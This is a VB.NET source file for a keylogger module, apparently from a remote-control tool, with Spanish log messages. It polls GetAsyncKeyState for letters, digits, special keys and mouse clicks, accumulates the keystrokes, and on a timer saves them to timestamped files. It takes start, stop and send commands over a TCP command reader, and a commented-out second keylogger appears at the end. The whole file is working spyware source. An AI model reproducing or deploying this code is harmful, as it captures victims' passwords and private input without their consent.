Imports System.Threading
Public Class KeyloggerModule
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    Public TECLA As String
    Public LogKeys As String

    Private Sub Keylogger_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        If My.Computer.FileSystem.DirectoryExists(Starter.DIRCommons & "\KeyloggerFiles") = False Then
            My.Computer.FileSystem.CreateDirectory(Starter.DIRCommons & "\KeyloggerFiles")
        End If
        TCPCMDReader.DiagnosticPosting("Keylogger Iniciado!", "TCP.DGN.Keylogger", True, False)
    End Sub

    Sub Objetive(ByVal Objetive As String)
        Me.Show()
        If Objetive = "StartKeylogger" Then
            StartKeylogger()
            Console.WriteLine("[KeyloggerModule@Objetive(StartKeylogger)]Keylogger a sido llamado a 'StartKeylogger'")
            TCPCMDReader.DiagnosticPosting("Keylogger llamado a: " & Objetive, "TCP.DGN.Keylogger", True, False)
        ElseIf Objetive = "StopKeylogger" Then
            StopKeylogger(True)
            Console.WriteLine("[KeyloggerModule@Objetive(StopKeylogger)]Keylogger a sido llamado a 'StopKeylogger'")
            TCPCMDReader.DiagnosticPosting("Keylogger llamado a: " & Objetive, "TCP.DGN.Keylogger", True, False)
        ElseIf Objetive = "SendKeyloggerData" Then
            SendKeyloggerData()
            Console.WriteLine("[KeyloggerModule@Objetive(SendKeyloggerData)]Keylogger a sido llamado a 'SendKeyloggerData'")
            TCPCMDReader.DiagnosticPosting("Keylogger llamado a: " & Objetive, "TCP.DGN.Keylogger", True, False)
        End If
    End Sub

    Sub StartKeylogger()
        Me.Show()
        KeyLogger_Threader.Start()
        Keylogger_Timer.Start()
        TECLA = Nothing
        LogKeys = Nothing
        Console.WriteLine("[KeyloggerModule@StartKeylogger]Keylogger Iniciado! -> " & Format(DateAndTime.TimeOfDay, "hh") & ":" & Format(DateAndTime.TimeOfDay, "mm") & ":" & Format(DateAndTime.TimeOfDay, "ss") & " @ " & DateAndTime.Today)
        TCPCMDReader.DiagnosticPosting("Keylogger registrando teclas...", "TCP.DGN.Keylogger", True, False)
    End Sub

    Sub StopKeylogger(ByVal Clear As Boolean)
        If Clear = True Then
            LogKeys = Nothing
            Me.Close()
        End If
        KeyLogger_Threader.Stop()
        Keylogger_Timer.Stop()
        Console.WriteLine("[KeyloggerModule@StopKeylogger]Keylogger Detenido! -> " & Format(DateAndTime.TimeOfDay, "hh") & ":" & Format(DateAndTime.TimeOfDay, "mm") & ":" & Format(DateAndTime.TimeOfDay, "ss") & " @ " & DateAndTime.Today)
        TCPCMDReader.DiagnosticPosting("Keylogger paro de registrando teclas!", "TCP.DGN.Keylogger", True, False)
    End Sub

    Private Sub Keylogger_Timer_Tick(sender As System.Object, e As System.EventArgs) Handles Keylogger_Timer.Tick
        Try
            'StopKeylogger(False)
            SendKeyloggerData()
            StartKeylogger()
            Console.WriteLine("[KeyloggerModule@Keylogger_Timer_Tick]Auto envio de datos de Keylogger (" & Keylogger_Timer.Interval & ")")
            TCPCMDReader.DiagnosticPosting("Keylogger envio de datos (" & Keylogger_Timer.Interval & ")", "TCP.DGN.Keylogger", True, False)
        Catch ex As Exception
            Console.WriteLine("[KeyloggerModule@Keylogger_Timer_Tick(Call SubActions)]Error: " & ex.Message)
        End Try
    End Sub

    Public FileObj As String
    Public FileNumber As String = "0"
    Public FileName As String
    Sub SendKeyloggerData()
        Try
            FileObj = Format(DateAndTime.TimeOfDay, "hh") & Format(DateAndTime.TimeOfDay, "mm") & Format(DateAndTime.TimeOfDay, "ss")
            FileName = "\KeyloggerFiles\[" & FileNumber & "_" & FileObj & "]LogKeysData.dat"
            KeyLogger_Threader.Stop()
            Keylogger_Timer.Stop()
            My.Computer.FileSystem.WriteAllText(Starter.DIRCommons & FileName, LogKeys, False)
            Console.WriteLine("Archivo de Keylogger escrito: " & Starter.DIRCommons & FileName)
            TCPCMDReader.DiagnosticPosting("Keylogger guardo teclas en: " & Starter.DIRCommons & FileName, "TCP.DGN.Keylogger", True, False)
            StartKeylogger()
        Catch ex As Exception
            Console.WriteLine("[KeyloggerModule@SendKeyloggerData:SaveLogKeys]Error: " & ex.Message)
        End Try
    End Sub

    Private Sub KeyLogger_Threader_Tick(sender As System.Object, e As System.EventArgs) Handles KeyLogger_Threader.Tick
        'KeyCatcher()
        Try
            If (GetAsyncKeyState(65)) Then
                TECLA = TECLA + "A"
            ElseIf (GetAsyncKeyState(66)) Then
                TECLA = TECLA + "B"
            ElseIf (GetAsyncKeyState(67)) Then
                TECLA = TECLA + "C"
            ElseIf (GetAsyncKeyState(68)) Then
                TECLA = TECLA + "D"
            ElseIf (GetAsyncKeyState(69)) Then
                TECLA = TECLA + "E"
            ElseIf (GetAsyncKeyState(70)) Then
                TECLA = TECLA + "F"
            ElseIf (GetAsyncKeyState(71)) Then
                TECLA = TECLA + "G"
            ElseIf (GetAsyncKeyState(72)) Then
                TECLA = TECLA + "H"
            ElseIf (GetAsyncKeyState(73)) Then
                TECLA = TECLA + "I"
            ElseIf (GetAsyncKeyState(74)) Then
                TECLA = TECLA + "J"
            ElseIf (GetAsyncKeyState(75)) Then
                TECLA = TECLA + "K"
            ElseIf (GetAsyncKeyState(76)) Then
                TECLA = TECLA + "L"
            ElseIf (GetAsyncKeyState(77)) Then
                TECLA = TECLA + "M"
            ElseIf (GetAsyncKeyState(78)) Then
                TECLA = TECLA + "N"
            ElseIf (GetAsyncKeyState(192)) Then
                TECLA = TECLA + "Ñ"
            ElseIf (GetAsyncKeyState(79)) Then
                TECLA = TECLA + "O"
            ElseIf (GetAsyncKeyState(80)) Then
                TECLA = TECLA + "P"
            ElseIf (GetAsyncKeyState(81)) Then
                TECLA = TECLA + "Q"
            ElseIf (GetAsyncKeyState(82)) Then
                TECLA = TECLA + "R"
            ElseIf (GetAsyncKeyState(83)) Then
                TECLA = TECLA + "S"
            ElseIf (GetAsyncKeyState(84)) Then
                TECLA = TECLA + "T"
            ElseIf (GetAsyncKeyState(85)) Then
                TECLA = TECLA + "U"
            ElseIf (GetAsyncKeyState(86)) Then
                TECLA = TECLA + "V"
            ElseIf (GetAsyncKeyState(87)) Then
                TECLA = TECLA + "W"
            ElseIf (GetAsyncKeyState(88)) Then
                TECLA = TECLA + "X"
            ElseIf (GetAsyncKeyState(89)) Then
                TECLA = TECLA + "Y"
            ElseIf (GetAsyncKeyState(90)) Then
                TECLA = TECLA + "Z"
            ElseIf (GetAsyncKeyState(48)) Then
                TECLA = TECLA + "0"
            ElseIf (GetAsyncKeyState(49)) Then
                TECLA = TECLA + "1"
            ElseIf (GetAsyncKeyState(50)) Then
                TECLA = TECLA + "2"
            ElseIf (GetAsyncKeyState(51)) Then
                TECLA = TECLA + "3"
            ElseIf (GetAsyncKeyState(52)) Then
                TECLA = TECLA + "4"
            ElseIf (GetAsyncKeyState(53)) Then
                TECLA = TECLA + "5"
            ElseIf (GetAsyncKeyState(54)) Then
                TECLA = TECLA + "6"
            ElseIf (GetAsyncKeyState(55)) Then
                TECLA = TECLA + "7"
            ElseIf (GetAsyncKeyState(56)) Then
                TECLA = TECLA + "8"
            ElseIf (GetAsyncKeyState(57)) Then
                TECLA = TECLA + "9"
            ElseIf (GetAsyncKeyState(96)) Then
                TECLA = TECLA + "{Num0}"
            ElseIf (GetAsyncKeyState(97)) Then
                TECLA = TECLA + "{Num1}"
            ElseIf (GetAsyncKeyState(98)) Then
                TECLA = TECLA + "{Num2}"
            ElseIf (GetAsyncKeyState(99)) Then
                TECLA = TECLA + "{Num3}"
            ElseIf (GetAsyncKeyState(100)) Then
                TECLA = TECLA + "{Num4}"
            ElseIf (GetAsyncKeyState(101)) Then
                TECLA = TECLA + "{Num5}"
            ElseIf (GetAsyncKeyState(102)) Then
                TECLA = TECLA + "{Num6}"
            ElseIf (GetAsyncKeyState(103)) Then
                TECLA = TECLA + "{Num7}"
            ElseIf (GetAsyncKeyState(104)) Then
                TECLA = TECLA + "{Num8}"
            ElseIf (GetAsyncKeyState(105)) Then
                TECLA = TECLA + "{Num9}"
            ElseIf (GetAsyncKeyState(106)) Then
                TECLA = TECLA + "{Num*}"
            ElseIf (GetAsyncKeyState(107)) Then
                TECLA = TECLA + "{Num+}"
            ElseIf (GetAsyncKeyState(13)) Then
                TECLA = TECLA + "{Enter}"
            ElseIf (GetAsyncKeyState(109)) Then
                TECLA = TECLA + "{Num-}"
            ElseIf (GetAsyncKeyState(110)) Then
                TECLA = TECLA + "{Num.}"
            ElseIf (GetAsyncKeyState(111)) Then
                TECLA = TECLA + "{Num/}"
            ElseIf (GetAsyncKeyState(32)) Then
                TECLA = TECLA + " "
            ElseIf (GetAsyncKeyState(188)) Then
                TECLA = TECLA + ","
            ElseIf (GetAsyncKeyState(190)) Then
                TECLA = TECLA + "."
            ElseIf (GetAsyncKeyState(8)) Then
                TECLA = TECLA + "{Backspace}"
            ElseIf (GetAsyncKeyState(9)) Then
                TECLA = TECLA + "{Tab}"
            ElseIf (GetAsyncKeyState(16)) Then
                TECLA = TECLA + "{Shift}"
            ElseIf (GetAsyncKeyState(17)) Then
                TECLA = TECLA + "{Control}"
            ElseIf (GetAsyncKeyState(20)) Then
                TECLA = TECLA + "{Caps}"
            ElseIf (GetAsyncKeyState(27)) Then
                TECLA = TECLA + "{Esc}"
            ElseIf (GetAsyncKeyState(33)) Then
                TECLA = TECLA + "{PGup}"
            ElseIf (GetAsyncKeyState(34)) Then
                TECLA = TECLA + "{PGdn}"
            ElseIf (GetAsyncKeyState(35)) Then
                TECLA = TECLA + "{End}"
            ElseIf (GetAsyncKeyState(36)) Then
                TECLA = TECLA + "{Home}"
            ElseIf (GetAsyncKeyState(37)) Then
                TECLA = TECLA + "{LArrow}"
            ElseIf (GetAsyncKeyState(38)) Then
                TECLA = TECLA + "{UArrow}"
            ElseIf (GetAsyncKeyState(39)) Then
                TECLA = TECLA + "{RArrow}"
            ElseIf (GetAsyncKeyState(40)) Then
                TECLA = TECLA + "{DArrow}"
            ElseIf (GetAsyncKeyState(45)) Then
                TECLA = TECLA + "{Insert}"
            ElseIf (GetAsyncKeyState(46)) Then
                TECLA = TECLA + "{Del}"
            ElseIf (GetAsyncKeyState(144)) Then
                TECLA = TECLA + "{NumLock}"
            ElseIf (GetAsyncKeyState(1)) Then
                TECLA = TECLA + "[L]"
            ElseIf (GetAsyncKeyState(2)) Then
                TECLA = TECLA + "[R]"
            End If
            LogKeys = LogKeys & TECLA
        Catch ex As Exception
            Console.WriteLine("[KeyloggerModule@KeyLogger_Threader_Tick]Error: " & ex.Message)
        End Try
    End Sub
End Class
'Module Module1
'    Private Declare Function GetAsyncKeyState Lib "User32" (ByVal vKey As Integer) As Integer
'    Dim _keys As String() = {"65", "66", "67", "68", "69", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79",
'                             "80", "81", "82", "83", "84", "85", "86", "87", "88", "89", "90", "32", "13", "49", "50",
'                             "51", "52", "53", "54", "55", "56", "57", "48"}
'    Dim _press As Boolean
'    Dim _tecla As Keys
'    Public texto As String
'    Public Sub KeyCatcher()
'        For Each k As String In _keys
'            _tecla = k
'            _press = GetAsyncKeyState(_tecla)
'            If _press = True Then
'                Thread.Sleep(200)
'                texto &= ChrW(k)
'            End If
'        Next
'    End Sub
'End Module